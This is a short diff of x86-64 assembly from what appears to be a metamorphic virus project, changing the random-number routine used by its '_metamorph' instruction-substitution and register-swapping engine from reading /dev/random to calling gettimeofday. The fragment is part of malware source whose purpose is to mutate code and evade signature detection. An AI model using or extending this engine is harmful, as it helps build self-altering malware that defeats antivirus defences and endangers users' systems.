@@ -1336,14 +1336,6 @@ _metamorph:; (rdi -> ptr)
 	push rdx
 	; xor_encrypt
 	; swap registry r8, r9 -> r9, r10 -> ... -> r14, r15 -> r8, r9 -> ...
-	push rdi
-	xor rsi, rsi; O_RDONLY
-	lea rdi, [rel dev_random]
-	mov rax, SYSCALL_OPEN
-	syscall
-	push rax
-	pop r8
-	pop rdi
 
 	lea rax, [rel _params]
 	lea rsi, [rel _ft_strlen]
@@ -1689,10 +1681,6 @@ _metamorph:; (rdi -> ptr)
 	.end_substitute_instruction:
 	pop rax
 
-	mov rdi, r8
-	mov rax, SYSCALL_CLOSE
-	syscall
-
 	pop rdx
 	pop rcx
 	pop rsi
@@ -1717,32 +1705,21 @@ ret
 _rand:
 	push rdi
 	push rsi
-	push rcx
-	push rdx
+		sub rsp, 16; sizeof struct timeval
+		lea rdi, [rsp]
+		xor rsi, rsi
+		push SYSCALL_GETTIMEOFDAY; gettimeofday
+		pop rax
+		syscall
 
-	mov rdi, r8
-	push r8
-	sub rsp, 1
+		mov rax, qword[rsp + 8]
 
-	mov rsi, rsp
-	mov rdx, 1
-	xor rax, rax; READ
-	syscall
-
-	xor rax, rax
-	movzx rax, byte[rsi]
-
-	add rsp, 1
-	pop r8
-
-	pop rdx
-	pop rcx
+		add rsp, 16
 	pop rsi
 	pop rdi
 ret
 
 swap_registry db `\xc0\xb8\xff\xbf\xf6\xbe\xd2\xba\xc9\xb9\xdb\xbb\xe4\xbc\xed\xbd`
-dev_random db `/dev/random`, 0x0
 
 ;						fingerprint
 _update_fingerprint:; (string rdi)
